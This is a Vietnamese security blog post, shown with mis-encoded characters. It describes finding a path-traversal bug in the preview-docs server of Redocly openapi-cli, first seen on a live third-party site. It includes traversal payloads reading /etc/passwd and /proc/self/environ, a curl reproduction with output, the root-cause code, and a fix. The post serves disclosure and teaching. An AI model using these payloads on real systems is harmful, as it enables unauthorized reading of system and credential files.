## A weird bug

G·∫ßn ƒë√¢y m√¨nh c√≥ g·∫∑p 1 case nh∆∞ th·∫ø n√†y (t·∫°m ƒë·∫∑t t√™n l√† `target.com`).

```
https://target.com/jsp/help-sb-download.jsp?sbFileName=../../../../../../../../../../etc/passwd
```

th√¨ tr·∫£ v·ªÅ l√†:

```
root:x:0:0:root:/root:/bin/bash
....
```

M·ªôt case LFI r√µ r√†ng qu√° r·ªìi. V√† m√¨nh ki·ªÉm tra l·∫°i CVE t∆∞∆°ng ·ª©ng v·ªõi l·ªói kia th√¨ n√≥ l√† **CVE-2020-8209**:

> Improper access control in Citrix XenMobile Server 10.12 before RP2, Citrix XenMobile Server 10.11 before RP4, Citrix XenMobile Server 10.10 before RP6 and Citrix XenMobile Server before 10.9 RP5 and leads to the ability to read arbitrary files.

Xem th√™m ·ªü: [https://swarm.ptsecurity.com/path-traversal-on-citrix-xenmobile-server/](https://swarm.ptsecurity.com/path-traversal-on-citrix-xenmobile-server/)

Tuy nhi√™n ƒë·ªÉ cho ch·∫Øc c√∫ th√¨ m√¨nh v·∫´n th·ª≠ v·ªõi c√°c payload LFI kh√°c trong nuclei v√† ph√°t hi·ªán ra m·ªôt ƒëi·ªÅu k√¨ l·∫°:

![](https://images.viblo.asia/daa0fc9c-2dd0-47a6-9b93-d527cef86cd7.png)

What the hell ???. Universal LFI √† ü§£
V·∫≠y kh·∫£ nƒÉng l√† kh√¥ng ph·∫£i CVE kia r·ªìi, v√† c√≥ th·ªÉ ƒë√¢y l√† m·ªôt l·ªói misconfiguration c·ªßa server chƒÉng. ƒê·ªÉ bi·∫øt ƒë∆∞·ª£c th√¨ ch√∫ng ta c·∫ßn th√™m 1 s·ªë th√¥ng tin.

## More fuzzing

Th√¥ng th∆∞·ªùng v·ªõi c√°c l·ªói LFI, ƒë·ªÉ c√≥ th√™m th√¥ng tin, ta s·∫Ω c·ªë g·∫Øng ƒë·ªçc c√°c file config ho·∫∑c c√°c th∆∞ m·ª•c, file ƒë·∫∑c bi·ªát. M·ªôt trong s·ªë ƒë√≥ l√† `/proc/self`. Th∆∞ m·ª•c n√†y ch·ª©a th√¥ng tin v·ªÅ ch√≠nh ti·∫øn tr√¨nh ƒëang x·ª≠ l√Ω request c·ªßa ch√∫ng ta.

ƒê·∫ßu ti√™n l√† `/proc/self/environ` s·∫Ω cho th√¥ng tin c√°c bi·∫øn m√¥i tr∆∞·ªùng c·ªßa ti·∫øn tr√¨nh. Request th·ª≠ ra r·∫•t nhi·ªÅu th√¥ng tin kh√°c nhau:

```
YARN_VERSION=1.22.5
npm_node_execpath=/usr/local/bin/node
npm_package_dependencies__types_lodash=^4.14.170
npm_package_dependencies__types_figlet=^1.5.1
npm_package_devDependencies_nodemon=^2.0.7
npm_package_devDependencies_fast_xml_parser=^3.19.0
npm_config_init_version=1.0.0
...
STATIC_ROOT_SERVER_PORT_80_TCP_PORT=80
...
PWD=/usr/app
...
PATH=/tmp/yarn--1629865924820-0.6746905619158616:/usr/app/node_modules/.bin:/usr/local/share/.config/yarn/link/node_modules/.bin:/usr/local/libexec/lib/node_modules/npm/bin/node-gyp-bin:/usr/local/lib/node_modules/npm/bin/node-gyp-bin:/usr/local/bin/node_modules/npm/bin/node-gyp-bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
NODE=/usr/local/bin/node
```

v·∫≠y kh·∫£ nƒÉng ƒë·∫øn 90% l√† ·ª©ng d·ª•ng n√†y ch·∫°y nodejs r·ªìi. V√† kh·∫£ nƒÉng l√† do l·ªói ·ª©ng d·ª•ng ch·ª© kh√¥ng ph·∫£i l·ªói c·∫•u h√¨nh server sai.

Ti·∫øp theo l√† `/proc/self/cmdline`: tr·∫£ ra c√¢u l·ªánh d√πng ƒë·ªÉ th·ª±c thi ch∆∞∆°ng tr√¨nh n√†y.

![](https://images.viblo.asia/f9af94c6-194b-452a-bc78-8ec060d0c1a2.png)

ta ch√∫ √Ω ƒë·∫øn ph·∫ßn cu·ªëi c√≥ `openapi preview-docs`. Google v·ªõi t·ª´ kh√≥a n√†y tr√™n m·∫°ng ƒë∆∞a m√¨nh ƒë·∫øn repo sau:

https://github.com/Redocly/openapi-cli

> ‚öíÔ∏è OpenAPI CLI toolbox with rich validation and bundling features.

T√∫m l·∫°i l√† m·ªôt c√¥ng c·ª• generate trang document t·ª´ file OpenAPi spec, gi·ªëng nh∆∞ Swagger v·∫≠y.

C√¥ng c·ª• n√†y l√† m·ªôt ph·∫ßn c·ªßa https://redoc.ly/ v√† repo https://github.com/Redocly/redoc : 

![](https://images.viblo.asia/eb5cd315-14a7-43a0-9215-e15aa17bb477.png)

OK, th·ª≠ d·ª±ng m√¥i tr∆∞·ªùng local v√† debug th·ª≠ th√¥i.

## Local reproduce

Sau khi clone repo tr√™n v·ªÅ ƒë·ªÉ tham kh·∫£o source code, m√¨nh c≈©ng c√†i lu√¥n package trong th∆∞ m·ª•c ƒë√≥:

```
npm install @redocly/openapi-cli
```

> N·∫øu b·∫°n mu·ªën reproduce l·∫°i th√¨ c·∫ßn c√†i ƒë√∫ng phi√™n b·∫£n b·ªã l·ªói: 1.0.0-beta.54

Sau khi c√†i xong th√¨ ch·∫°y 

```
‚ûú  openapi-cli git:(master) ‚úó node node_modules/@redocly/openapi-cli/bin/cli.js preview-docs -p 8899  resources/pets.yaml
Using Redoc community edition.
Login with openapi-cli login or use an enterprise license key to preview with the premium docs.


  üîé  Preview server running at http://127.0.0.1:8899

  üëÄ  Watching resources/pets.yaml and all related resources for changes


Bundling...

Created a bundle for resources/pets.yaml successfully
```

v√† th·ª≠ l·∫°i payload:

```
‚ûú  Vigo curl "http://localhost:8899/?id=../../../../../../../../../../etc/passwd" -v
*   Trying 127.0.0.1:8899...
* TCP_NODELAY set
* Connected to localhost (127.0.0.1) port 8899 (#0)
> GET /?id=../../../../../../../../../../etc/passwd HTTP/1.1
> Host: localhost:8899
> User-Agent: curl/7.68.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Content-Type: application/octet-stream
< Date: Thu, 30 Sep 2021 02:51:54 GMT
< Connection: keep-alive
< Keep-Alive: timeout=5
< Transfer-Encoding: chunked
<
root:x:0:0:root:/root:/bin/bash
...
```

v·∫´n ho·∫°t ƒë·ªông t·ªët. V·∫≠y hung th·ªß l√† ƒë√¢y ch·ª© c√≤n ai n·ªØa.

## Root cause
Sau kho·∫£ng m·ªôt l√∫c ƒë·ªçc hi·ªÉu code th√¨ m√¨nh t√¨m ra ph·∫ßn x·ª≠ l√Ω l·ªánh `preview-docs` n√†y n·∫±m ·ªü file 
`node_modules/@redocly/openapi-cli/lib/commands/preview-docs/preview-server/preview-server.js` v√† ph·∫ßn ch√∫ng ta c·∫ßn quan t√¢m l√† h√†m n√†y:

```js
function startPreviewServer(port, { getBundle, getOptions, useRedocPro, }) {
    return __awaiter(this, void 0, void 0, function* () {
        const defaultTemplate = path.join(__dirname, 'default.hbs');
        const handler = (request, response) => __awaiter(this, void 0, void 0, function* () {
            console.time(colorette.dim(`GET ${request.url}`));
            const { htmlTemplate } = getOptions() || {};
            if (request.url === '/') {
                server_1.respondWithGzip(getPageHTML(htmlTemplate || defaultTemplate, getOptions(), useRedocPro, wsPort), request, response, {
                    'Content-Type': 'text/html',
                });
            }
            else if (request.url === '/openapi.json') {
                const bundle = yield getBundle();
                if (bundle === undefined) {
                    server_1.respondWithGzip(JSON.stringify({
                        openapi: '3.0.0',
                        info: {
                            description: '<code> Failed to generate bundle: check out console output for more details </code>',
                        },
                        paths: {},
                    }), request, response, {
                        'Content-Type': 'application/json',
                    });
                }
                else {
                    server_1.respondWithGzip(JSON.stringify(bundle), request, response, {
                        'Content-Type': 'application/json',
                    });
                }
            }
            else {
                const filePath = 
                // @ts-ignore
                {
                    '/hot.js': path.join(__dirname, 'hot.js'),
                    '/simplewebsocket.min.js': require.resolve('simple-websocket/simplewebsocket.min.js'),
                }[request.url || ''] ||
                    path.resolve(htmlTemplate ? path.dirname(htmlTemplate) : process.cwd(), `.${request.url}`);
                const extname = String(path.extname(filePath)).toLowerCase();
                const contentType = server_1.mimeTypes[extname] || 'application/octet-stream';
                try {
                    server_1.respondWithGzip(yield fs_1.promises.readFile(filePath), request, response, {
                        'Content-Type': contentType,
                    });
                }
                catch (e) {
                    if (e.code === 'ENOENT') {
                        server_1.respondWithGzip('404 Not Found', request, response, { 'Content-Type': 'text/html' }, 404);
                    }
                    else {
                        server_1.respondWithGzip(`Something went wrong: ${e.code || e.message}...\n`, request, response, {}, 500);
                    }
                }
            }
            console.timeEnd(colorette.dim(`GET ${request.url}`));
        });
        let wsPort = yield portfinder.getPortPromise({ port: 32201 });
        const server = server_1.startHttpServer(port, handler);
        server.on('listening', () => {
            process.stdout.write(`\n  üîé  Preview server running at ${colorette.blue(`http://127.0.0.1:${port}\n`)}`);
        });
        return server_1.startWsServer(wsPort);
    });
}
```

v·ªõi request `?id=../../../../../../../../../../etc/passwd` th√¨ `request.url` s·∫Ω kh√¥ng match v·ªõi b·∫•t c·ª© rule n√†o v√† nh·∫£y v√†o ƒëo·∫°n else cu·ªëi c√πng v√† ƒë·∫øn ƒëo·∫°n:

```js
                const filePath = 
                // @ts-ignore
                {
                    '/hot.js': path.join(__dirname, 'hot.js'),
                    '/simplewebsocket.min.js': require.resolve('simple-websocket/simplewebsocket.min.js'),
                }[request.url || ''] ||
                    path.resolve(htmlTemplate ? path.dirname(htmlTemplate) : process.cwd(), `.${request.url}`);
                const extname = String(path.extname(filePath)).toLowerCase();
```
s·∫Ω resolve ƒë∆∞·ªùng d·∫´n file v√† ƒë·ªçc n·ªôi dung. ƒêo·∫°n `filePath` n√†y tr√¥ng c√≥ v·∫ª l·∫±ng nh·∫±ng nh∆∞ng c√≥ th·ªÉ thu g·ªçn v·ªÅ th√†nh:

```js
const filePath = path.resolve(process.cwd(), `.${request.url}`)
```

Gi·∫£ s·ª≠ ƒë∆∞·ªùng d·∫´n c·ªßa ch√∫ng ta l√† `/home/vigo/open-cli`, v·ªõi `request.url` l√† `/text.txt` ch·∫≥ng h·∫°n, s·∫Ω ƒë∆∞·ª£c gh√©p th√†nh `./test.txt` v√† resolve k√®m v·ªõi th∆∞ m·ª•c hi·ªán t·∫°i v·ªõi mong mu·ªën l·∫•y ra file trong th∆∞ m·ª•c n√†y. Nh∆∞ng ƒë·ªùi kh√¥ng nh∆∞ l√† m∆°:

![](https://images.viblo.asia/21478f7a-5c54-42cd-ad7f-e93994396bf8.png)

v·ªõi c√°ch n√†y ta ƒë√£ khai th√°c ƒë∆∞·ª£c l·ªói path traversal, cho ph√©p ƒë·ªçc file t√πy √Ω.

## The end

V·∫≠y ƒë·ªÉ fix bug n√†y ch√∫ng ta c·∫ßn l√†m 2 vi·ªác:
1. ƒê∆°n gi·∫£n ch·ªâ c·∫ßn strip b·ªè to√†n b·ªô c√°c query param, hash fragment r·ªìi m·ªõi ƒë∆∞a qua h√†m `path.resolve`.
2. Kh√¥ng s·ª≠ d·ª•ng c√°c c√¢u l·ªánh dev/preview ch·∫°y tr√™n production (ch·∫Øc b√°c dev n√†y mu·ªën ti·∫øt ki·ªám ti·ªÅn, kh√¥ng mu·ªën d√πng b·∫£n premium ƒë√¢y m√† ü§£).

> Nh·ªõ c·∫≠p nh·∫≠t l√™n phi√™n b·∫£n m·ªõi ƒë·ªÉ kh√¥ng b·ªã l·ªói n·ªØa nh√©

See ya~